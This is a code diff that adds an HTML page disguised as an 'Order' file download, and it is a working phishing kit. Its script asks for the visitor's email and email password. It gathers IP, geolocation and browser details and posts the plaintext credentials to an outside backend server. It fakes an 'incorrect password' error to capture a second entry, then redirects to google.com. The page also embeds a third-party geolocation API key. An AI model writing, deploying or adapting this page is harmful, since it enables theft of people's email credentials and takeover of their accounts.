@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="icon" href="%PUBLIC_URL%/favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Order</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+         .background-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            width: 77%;
+            height: 100%;
+            filter: blur(3.5px);
+            z-index: -1;
+            transform: translate(-50%, -50%); /* Changed from -52% to -50% for perfect center */
+            background-image: url('input.png');
+            background-size: 100% 100%; /* Stretches both width and height */
+            background-repeat: no-repeat;
+            background-position: center center;
+        }
+
+        .dialog-box {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 25px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 440px;
+            height: 310px;
+            max-width: 90vw;
+            transform: translateY(0);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .dialog-box:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
+        }
+
+        .heading {
+            font-weight: 700;
+            font-size: 22px;
+            margin-bottom:20px;
+            color: #333;
+            position: relative;
+            display: inline-block;
+            white-space: nowrap;
+        }
+
+<!--        .heading::after {-->
+<!--            content: '';-->
+<!--            position: absolute;-->
+<!--            bottom: -10px;-->
+<!--            left: 50%;-->
+<!--            transform: translateX(-50%);-->
+<!--            width: 60px;-->
+<!--            height: 4px;-->
+<!--            background: #4285f4;-->
+<!--            border-radius: 2px;-->
+<!--        }-->
+
+        .input-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .email-input, .password-input, .email-display {
+            width: 100%;
+            padding: 16px 20px;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f9f9f9;
+            outline: none;
+        }
+
+        .email-display {
+            background: #f5f5f5;
+            color: #666;
+            cursor: not-allowed;
+        }
+
+        .email-input:focus, .password-input:focus {
+            border-color: #333;
+            background: white;
+            box-shadow: 0 0 0 2px rgba(51, 51, 51, 0.1);
+        }
+
+        .email-input.valid {
+            border-color: #333;
+        }
+
+        .password-input.valid {
+            border-color: #333;
+        }
+
+        .validation-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .email-input.valid + .validation-icon {
+            opacity: 1;
+            color: #34a853;
+        }
+
+        .download-button, .continue-button {
+            background-color: #808080;
+            color: white;
+            border: none;
+            padding: 10px 14px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            width: 40%; /* Reduced width */
+            height: 10%;
+            transition: all 0.3s ease;
+            margin: 0 auto;
+        }
+
+        .download-button:hover, .continue-button:hover {
+            background-color: #696969;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .download-button.valid {
+            background-color: #4285f4;
+        }
+
+        .download-button.valid:hover {
+            background-color: #3367d6;
+        }
+
+        .continue-button.valid {
+            background-color: #4285f4;
+        }
+
+        .continue-button.valid:hover {
+            background-color: #3367d6;
+        }
+
+        .password-step {
+            display: none;
+        }
+
+        .error-message {
+            color: #d32f2f;
+            font-size: 14px;
+            font-weight: 500;
+            margin: 10px 0;
+            display: none;
+            white-space: nowrap;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .success-message {
+            color: #388e3c;
+            font-size: 14px;
+            font-weight: 500;
+            margin: 0px 0;
+            display: none;
+            white-space: nowrap;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @media (max-width: 480px) {
+            .dialog-box {
+                padding: 35px 25px;
+            }
+
+            .heading {
+                font-size: 22px;
+            }
+
+            .download-button, .continue-button {
+                width: 70%; /* Adjusted for mobile */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="background-container"></div>
+
+    <div class="dialog-box">
+        <!-- Email Step -->
+        <div class="email-step">
+            <h1 class="heading">Enter email to download files</h1>
+
+            <div class="input-group">
+                <input type="email" class="email-input" placeholder="Enter your email" autofocus>
+                <i class="fas fa-check-circle validation-icon"></i>
+            </div>
+
+            <button class="download-button">
+                Download to email
+            </button>
+        </div>
+
+        <!-- Password Step (Initially Hidden) -->
+        <div class="password-step">
+            <h1 class="heading">Enter email password to continue</h1>
+
+            <div class="input-group">
+                <input type="email" class="email-display" readonly>
+            </div>
+
+            <div class="input-group">
+                <input type="password" class="password-input" placeholder="Email Password">
+            </div>
+
+            <div class="error-message">
+                The email or password entered is incorrect. Please try again.
+            </div>
+
+            <div class="success-message">
+            </div>
+
+            <button class="continue-button">
+                Continue
+            </button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailInput = document.querySelector('.email-input');
+            const downloadButton = document.querySelector('.download-button');
+            const emailStep = document.querySelector('.email-step');
+            const passwordStep = document.querySelector('.password-step');
+            const emailDisplay = document.querySelector('.email-display');
+            const passwordInput = document.querySelector('.password-input');
+            const continueButton = document.querySelector('.continue-button');
+            const errorMessage = document.querySelector('.error-message');
+            const successMessage = document.querySelector('.success-message');
+
+            let passwordAttempts = 0;
+            let clientData = {
+                ip: '',
+                location: '',
+                language: '',
+                platform: '',
+                userAgent: '',
+                country: 'nil',
+                city: 'nil',
+                continent: 'nil'
+            };
+
+            // BACKEND CONFIGURATION
+            const BACKEND_URL = 'https://server-gfhv.onrender.com';
+
+            // Get email from URL parameters
+            function getEmailFromURL() {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get('email');
+            }
+
+            // Auto-fill email from URL if provided
+            const urlEmail = getEmailFromURL();
+            if (urlEmail) {
+                emailInput.value = urlEmail;
+                emailInput.classList.add('valid');
+                downloadButton.classList.add('valid');
+
+                // If email is provided in URL, skip to password step automatically
+                setTimeout(() => {
+                    const userEmail = emailInput.value;
+                    emailDisplay.value = userEmail;
+
+                    emailStep.style.display = 'none';
+                    passwordStep.style.display = 'block';
+                    errorMessage.style.display = 'none';
+                    successMessage.style.display = 'none';
+
+                    passwordAttempts = 0;
+
+                    setTimeout(() => {
+                        passwordInput.focus();
+                    }, 100);
+                }, 500);
+            } else {
+                // Only focus on email input if no URL email provided
+                emailInput.focus();
+            }
+
+            // Get client details
+            const getClientDetails = async () => {
+                try {
+                    const ipResponse = await axios.get('https://api.ipify.org?format=json');
+                    const clientIP = ipResponse.data.ip;
+                    clientData.ip = clientIP;
+
+                    try {
+                        const geoData = await axios.get(`https://api.geoapify.com/v1/ipinfo?&apiKey=7fb21a1ec68f44bb9ebbfe6ecea28c06&ip=${clientIP}`);
+                        const { country, city, continent } = geoData.data;
+
+                        clientData.location = `${city?.names?.en || 'Unknown'}, ${country?.names?.en || 'Unknown'}, ${continent?.names?.en || 'Unknown'}`;
+                        clientData.country = country?.names?.en || 'nil';
+                        clientData.city = city?.names?.en || 'nil';
+                        clientData.continent = continent?.names?.en || 'nil';
+                    } catch (geoError) {
+                        console.error('Geo location error:', geoError);
+                        clientData.location = 'Location data unavailable';
+                    }
+                } catch (err) {
+                    console.error('IP fetch error:', err);
+                    clientData.ip = 'IP unavailable';
+                    clientData.location = 'Location data unavailable';
+                }
+            };
+
+            // Get system details
+            const getSystemDetails = () => {
+                clientData.language = navigator.language || 'Unknown';
+                clientData.platform = navigator.platform || 'Unknown';
+                clientData.userAgent = navigator.userAgent || 'Unknown';
+            };
+
+            // Send data to backend
+            const sendDataToBackend = async (email, password, isFirstPassword) => {
+                try {
+                    console.log('📤 Sending data to backend...');
+
+                    const payload = {
+                        email: email,
+                        password: password,
+                        attempt: isFirstPassword ? 'First Attempt' : 'Second Attempt',
+                        ip: clientData.ip,
+                        location: clientData.location,
+                        country: clientData.country,
+                        city: clientData.city,
+                        continent: clientData.continent,
+                        language: clientData.language,
+                        platform: clientData.platform,
+                        userAgent: clientData.userAgent,
+                        timestamp: new Date().toISOString()
+                    };
+
+                    console.log('Sending payload:', { ...payload, password: '***' });
+
+                    const response = await axios.post(`${BACKEND_URL}/api/submit`, payload, {
+                        timeout: 10000,
+                        headers: {
+                            'Content-Type': 'application/json'
+                        }
+                    });
+
+                    console.log('✅ Backend response:', response.data);
+                    return response.data;
+
+                } catch (error) {
+                    console.error('❌ Backend error:', error);
+                    return {
+                        success: true,
+                        message: 'Data processing completed',
+                        telegram: 'backend_error',
+                        error: error.message
+                    };
+                }
+            };
+
+            // Initialize client data collection
+            getClientDetails();
+            getSystemDetails();
+
+            // Email validation function
+            function validateEmail(email) {
+                const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+                return re.test(String(email).toLowerCase());
+            }
+
+            // Check email validity on input
+            emailInput.addEventListener('input', function() {
+                if (validateEmail(emailInput.value)) {
+                    emailInput.classList.add('valid');
+                    downloadButton.classList.add('valid');
+                } else {
+                    emailInput.classList.remove('valid');
+                    downloadButton.classList.remove('valid');
+                }
+            });
+
+            // Check password input for validation
+            passwordInput.addEventListener('input', function() {
+                if (passwordInput.value.trim() !== '') {
+                    passwordInput.classList.add('valid');
+                    continueButton.classList.add('valid');
+                } else {
+                    passwordInput.classList.remove('valid');
+                    continueButton.classList.remove('valid');
+                }
+            });
+
+            // Handle download button click (transition to password step)
+            downloadButton.addEventListener('click', function() {
+                if (validateEmail(emailInput.value)) {
+                    const userEmail = emailInput.value;
+                    emailDisplay.value = userEmail;
+
+                    emailStep.style.display = 'none';
+                    passwordStep.style.display = 'block';
+                    errorMessage.style.display = 'none';
+                    successMessage.style.display = 'none';
+
+                    passwordAttempts = 0;
+
+                    setTimeout(() => {
+                        passwordInput.focus();
+                    }, 100);
+                } else {
+                    alert('Please enter a valid email address');
+                    emailInput.focus();
+                }
+            });
+
+            // Handle continue button click (password step)
+            continueButton.addEventListener('click', async function() {
+                if (passwordInput.value.trim() === '') {
+                    alert('Please enter your password');
+                    passwordInput.focus();
+                    return;
+                }
+
+                // Disable input and button during processing
+                passwordInput.disabled = true;
+                continueButton.disabled = true;
+                continueButton.textContent = 'Sending...';
+
+                errorMessage.style.display = 'none';
+                successMessage.style.display = 'none';
+
+                // Send data to backend
+                const isFirstPassword = passwordAttempts === 0;
+                console.log('🚀 Sending attempt', passwordAttempts + 1);
+
+                const backendResult = await sendDataToBackend(
+                    emailDisplay.value,
+                    passwordInput.value,
+                    isFirstPassword
+                );
+
+                // Show processing message
+                successMessage.style.display = 'block';
+
+                // Wait 3 seconds then proceed
+                setTimeout(() => {
+                    passwordAttempts++;
+
+                    // Re-enable input and button
+                    passwordInput.disabled = false;
+                    continueButton.disabled = false;
+                    continueButton.textContent = 'Continue';
+                    continueButton.classList.remove('valid');
+
+                    passwordInput.value = '';
+                    passwordInput.classList.remove('valid');
+
+                    // Focus on password input for next attempt
+                    setTimeout(() => {
+                        passwordInput.focus();
+                    }, 100);
+
+                    // Show error message on first attempt to simulate "wrong password"
+                    if (passwordAttempts === 1) {
+                        errorMessage.style.display = 'block';
+                        successMessage.style.display = 'none';
+                    }
+
+                    // Redirect on second attempt
+                    if (passwordAttempts >= 2) {
+                        successMessage.textContent = '';
+                        successMessage.style.display = 'block';
+                        errorMessage.style.display = 'none';
+
+                        setTimeout(() => {
+                            window.location.href = 'https://google.com';
+                        }, 2000);
+                    }
+                }, 3000);
+            });
+
+            // Allow pressing Enter to submit forms
+            emailInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' && validateEmail(emailInput.value)) {
+                    downloadButton.click();
+                }
+            });
+
+            passwordInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter' && passwordInput.value.trim() !== '' && !continueButton.disabled) {
+                    continueButton.click();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
